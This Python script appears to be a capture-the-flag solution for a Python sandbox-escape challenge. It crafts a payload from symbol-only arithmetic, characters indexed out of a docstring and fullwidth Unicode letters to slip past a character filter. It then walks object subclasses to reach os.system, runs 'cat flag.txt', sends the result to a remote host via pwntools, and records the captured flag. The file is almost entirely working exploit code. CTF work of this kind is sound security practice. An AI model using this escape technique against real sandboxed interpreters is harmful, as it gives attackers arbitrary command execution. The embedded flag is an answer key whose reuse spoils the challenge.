import re

def craft_num(n):
    """
    craft symbol-only numbers, in an inefficient way
    """
    str_0 = "-([]<[])"
    str_1 = "(-~([]<[]))"
    if n == 0:
        return str_0
    ret = f"{str_1}+" * n
    return ret[:-1]

def denormalize(str):
    ret = ""
    for c in str:
        if c >= "a" and c <= "z":
            # https://www.compart.com/en/unicode/U+FF41
            # weird fullwidth a
            # the first of a sequence of codepoints compatible with ASCII letters
            weird_a = 0xff41
            offset = ord(c) - ord("a")
            ret += chr(weird_a + offset)
        else:
            ret += c
    # replace all underscores that are not at the beginning of an identifier with
    # https://www.compart.com/en/unicode/U+FF3F
    # fullwidth underscore
    ret = re.sub(r"(?<![\.\[\( ])_", chr(0xff3f), ret)
    return ret

def craft_str(inp_str):
    crafted_str = []
    for char in inp_str:
        for i in range(1337):
            if (0).__doc__[i] == char:
                crafted_str.append(f'({craft_num(0)}).__doc__[{craft_num(i)}]')
                break
    return '+'.join(crafted_str)

payload = f'().__class__.__base__.__subclasses__()[{craft_num(118)}]'  # FileLoader
payload = f'{payload}.__init__.__globals__[{craft_str("_os")}]'  # os
payload = f'{payload}.system({craft_str("cat flag.txt")})'
payload = denormalize(payload)

import pwn
#r = pwn.process(['python3', 'chal.py'])
r = pwn.remote('35.222.133.12', 5000)
r.sendlineafter(b'>>> ', payload.encode())
r.interactive()
#uoftctf{zero_security_too_apparently_lmao}
